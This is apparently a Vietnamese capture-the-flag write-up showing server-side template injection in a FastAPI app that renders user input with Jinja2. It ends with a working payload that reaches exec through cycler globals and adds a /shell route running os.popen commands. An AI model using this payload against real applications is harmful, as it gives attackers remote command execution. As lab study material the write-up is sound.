# Shell python

## Phân tích

```python!
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
from jinja2 import Environment

app = FastAPI()
Jinja2 = Environment()

@app.get("/")
async def index():
    return {"text": "Welcome to the hall of fame!"}

@app.get("/welcome")
async def round(username="hacker"):
    output = Jinja2.from_string("Can you defeat me " + username).render()
    return HTMLResponse(content=output)


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, port=9001)
```

- đọc đoạn code em thấy ứng dụng sử dụng `Jinja2.from_string()` để render với dữ liệu từ người dùng mà không được kiểm tra hoặc lọc trước điều này tạo ra cơ hội khai thác SSTI

![image](https://hackmd.io/_uploads/SkxHcrCvyx.png)

- thấy được ứng dụng thực thi phép tính 7\*7

- để upload 1 shell lên em thông qua SSTI để tạo 1 route mới vào ứng dụng web FastAPI
- thông qua việc tìm cách add 1 route động vào ứng dụng FastAPI chat GPT có đề cập đến hàm `add_api_route()` tương tự với như `add_url_rule()` bên Flask và em dùng hàm này để tạo route mới
  - FastAPI cho phép thêm các route động thông qua phương thức `add_api_route` của đối tượng `app` ngay cả sau khi ứng dụng đã được khởi tạo với cú pháp `app.add_api_route("/new_route", new_route_function)`.
  - Điều này rất hữu ích trong các tình huống cần cấu hình ứng dụng một cách linh hoạt và cũng có thể bị lợi dụng trong các cuộc tấn công như RCE nếu không có biện pháp bảo vệ.

![image](https://hackmd.io/_uploads/BJZp7URPke.png)

- `cycler.__init__.__globals__['__builtins__']`: Đây là cách để truy cập vào không gian tên toàn cục (**globals**) của hàm **init** của đối tượng cycler. Bằng cách này, em có thể truy cập vào các hàm built-in của Python, như `exec`, `eval`, ...
- em dùng hàm `exec()` để thực thi mã Python từ một chuỗi văn bản
- tiếp theo em truy cập vào biến app thông qua `sys.modules['__main__'].app`:

  - Hàm `__import__('sys')` dùng để import module `sys` trong Python sau đó truy cập đến `sys.modules` nó sẽ chứa tất cả các module đã được import trong Python trong đó có `__main__`.
  - trong `sys.modules['__main__']` em có thể truy cập vào tất cả các biến, hàm, và lớp đã được khai báo trong module đó, trong đó có biến `app`

- tiếp theo em dùng `app.add_api_route()` để thêm một route mới vào ứng dụng FastAPI
- cuối cùng em tạo route `/shell` sẽ thực thi lệnh hệ thống thông qua tham số `cmd` từ query string và sử dụng `os.popen(cmd).read()` để thực thi lệnh

- payload sẽ như sau:

```python!
{{cycler.__init__.__globals__['__builtins__']['exec']("__import__('sys').modules['__main__'].app.add_api_route('/shell',lambda+cmd%3a__import__('os').popen(cmd).read(),methods%3d['GET'])")}}
```

![image](https://hackmd.io/_uploads/H1jx1I0w1l.png)

- truy cập route vừa tạo và em thực thi được shell

![image](https://hackmd.io/_uploads/rk1UyUCDkl.png)
